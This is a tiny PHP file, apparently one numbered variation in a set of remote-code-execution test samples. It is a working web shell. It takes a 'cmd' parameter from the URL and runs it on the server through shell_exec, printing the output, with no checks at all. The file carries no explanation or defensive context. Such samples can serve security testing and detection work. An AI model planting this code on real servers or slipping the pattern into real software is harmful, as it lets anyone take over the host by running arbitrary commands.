<?php
// RCE test variation #1324
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>